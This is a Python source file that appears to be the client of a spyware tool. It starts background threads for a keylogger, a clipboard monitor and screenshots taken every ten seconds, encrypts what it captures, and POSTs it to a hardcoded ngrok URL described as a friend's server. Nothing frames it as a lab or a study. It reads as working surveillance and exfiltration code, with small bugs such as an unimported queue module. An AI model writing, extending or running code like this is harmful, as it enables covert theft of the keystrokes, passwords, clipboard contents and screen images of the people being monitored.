import threading
import keylogger
import clipboard_monitor as clipboard
import screenshot
import client_gui
import requests
from cryptography.fernet import Fernet
from PIL import Image
import os
import time
import platform
from retrying import retry
import io
import json
import base64

# Server URL (friend's ngrok URL)
SERVER_URL = "https://0ee5-2409-40d0-203f-19e5-21bf-a036-b75b-5fa7.ngrok-free.app/upload"

# Load encryption key from secret.key
def load_key():
    try:
        with open("secret.key", "rb") as key_file:
            return key_file.read()
    except Exception as e:
        with open("error_log.txt", "a") as f:
            f.write(f"Key load error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")
        raise

key = load_key()
cipher = Fernet(key)

# Global variables
from keylogger import keystroke_queue
from clipboard_monitor import clipboard_queue
screenshot_count = 0
keylog_count = 0
clipboard_count = 0

@retry(stop_max_attempt_number=3, wait_fixed=5000)
def send_data_to_server(data, screenshot_data=None):
    """Send encrypted data to server with retry logic."""
    global keylog_count, clipboard_count
    try:
        # Add type to data
        data_type = data.get("type", "unknown")
        # Serialize and encrypt data
        encrypted_data = cipher.encrypt(json.dumps(data).encode())
        encoded_data = base64.b64encode(encrypted_data).decode()
        form_data = {"data": encoded_data, "data_type": data_type}
        files = None
        if screenshot_data:
            # Verify encryption
            try:
                cipher.decrypt(screenshot_data)
            except Exception as e:
                with open("error_log.txt", "a") as f:
                    f.write(f"Invalid screenshot encryption at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")
                raise ValueError("Screenshot data is not properly encrypted")
            files = {"screenshot": (f"screenshot_{screenshot_count}.bin", screenshot_data, "application/octet-stream")}
        else:
            # Save encrypted data as .bin for debugging
            if data_type == "keylog":
                bin_path = f"keylog_{keylog_count}.bin"
                with open(bin_path, "wb") as f:
                    f.write(encrypted_data)
                with open("error_log.txt", "a") as f:
                    f.write(f"Saved encrypted keylog at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {bin_path}\n")
                keylog_count += 1
            elif data_type == "clipboard":
                bin_path = f"clipboard_{clipboard_count}.bin"
                with open(bin_path, "wb") as f:
                    f.write(encrypted_data)
                with open("error_log.txt", "a") as f:
                    f.write(f"Saved encrypted clipboard at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {bin_path}\n")
                clipboard_count += 1
            # Comment out to keep .bin for debugging
            # os.remove(bin_path)

        response = requests.post(SERVER_URL, data=form_data, files=files)
        with open("error_log.txt", "a") as f:
            f.write(f"Data sent at {data['timestamp']}: Type={data_type}, Status={response.status_code}, Keystrokes={data['keystrokes'][:50]}, Clipboard={data['clipboard'][:50]}\n")
        return response
    except Exception as e:
        with open("error_log.txt", "a") as f:
            f.write(f"Send error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")
        raise

def process_queues():
    """Process keystroke and clipboard queues for immediate sending."""
    while True:
        try:
            # Check keystroke queue
            try:
                data = keystroke_queue.get_nowait()
                response = send_data_to_server(data)
                with open("error_log.txt", "a") as f:
                    f.write(f"Sent keystroke batch at {data['timestamp']}: Keystrokes={data['keystrokes'][:50]}, Clipboard={data['clipboard'][:50]} (Length={len(data['clipboard'])})\n")
            except queue.Empty:
                pass

            # Check clipboard queue
            try:
                data = clipboard_queue.get_nowait()
                data["type"] = "clipboard"
                response = send_data_to_server(data)
                with open("error_log.txt", "a") as f:
                    f.write(f"Sent clipboard at {data['timestamp']}: Keystrokes={data['keystrokes'][:50]}, Clipboard={data['clipboard'][:50]} (Length={len(data['clipboard'])})\n")
            except queue.Empty:
                pass

            time.sleep(0.1)  # Avoid CPU overload
        except Exception as e:
            with open("error_log.txt", "a") as f:
                f.write(f"Queue process error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")

def send_screenshots():
    """Send screenshots every 10 seconds."""
    global screenshot_count
    while True:
        try:
            screenshot_path = f"screenshot_{screenshot_count}.png"
            screenshot.capture_screenshot()
            if os.path.exists(screenshot_path):
                img = Image.open(screenshot_path)
                compressed_path = f"compressed_screenshot_{screenshot_count}.jpg"
                img.save(compressed_path, quality=50)

                with open(compressed_path, "rb") as f:
                    screenshot_data = f.read()

                # Verify image data before encryption
                try:
                    img = Image.open(io.BytesIO(screenshot_data))
                    img.verify()
                except Exception as e:
                    with open("error_log.txt", "a") as f:
                        f.write(f"Screenshot verification error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")
                    raise

                # Encrypt and save as .bin for debugging
                encrypted_screenshot = cipher.encrypt(screenshot_data)
                bin_path = f"screenshot_{screenshot_count}.bin"
                with open(bin_path, "wb") as f:
                    f.write(encrypted_screenshot)
                with open("error_log.txt", "a") as f:
                    f.write(f"Saved encrypted screenshot at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {bin_path}\n")

                data = {
                    "keystrokes": [],
                    "clipboard": "",
                    "timestamp": time.strftime("%Y-%m-%d_%H-%M-%S"),
                    "type": "screenshot"
                }
                response = send_data_to_server(data, encrypted_screenshot)

                # Clean up
                os.remove(screenshot_path)
                os.remove(compressed_path)
                # Comment out to keep .bin for debugging
                # os.remove(bin_path)
                screenshot_count += 1
            else:
                with open("error_log.txt", "a") as f:
                    f.write(f"Screenshot error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: File not found\n")
        except Exception as e:
            with open("error_log.txt", "a") as f:
                f.write(f"Screenshot send error at {time.strftime('%Y-%m-%d_%H-%M-%S')}: {e}\n")
        time.sleep(10)

def main():
    """Start all capture threads and GUI."""
    try:
        if platform.system() == "Windows":
            try:
                import pythoncom
                pythoncom.CoInitialize()
            except ImportError:
                with open("error_log.txt", "a") as f:
                    f.write("Warning: pythoncom not available, skipping COM initialization\n")

        # Start keylogger thread
        keylogger_thread = threading.Thread(target=keylogger.start_keylogger)
        keylogger_thread.daemon = True
        keylogger_thread.start()

        # Start clipboard monitor thread
        clipboard_thread = threading.Thread(target=clipboard.monitor_clipboard)
        clipboard_thread.daemon = True
        clipboard_thread.start()

        # Start queue processing thread
        queue_thread = threading.Thread(target=process_queues)
        queue_thread.daemon = True
        queue_thread.start()

        # Start screenshot sending thread
        screenshot_thread = threading.Thread(target=send_screenshots)
        screenshot_thread.daemon = True
        screenshot_thread.start()

        # Start GUI in main thread
        client_gui.start_gui()

    except Exception as e:
        with open("error_log.txt", "a") as f:
            f.write(f"Main thread error: {e}\n")

if __name__ == "__main__":
    main()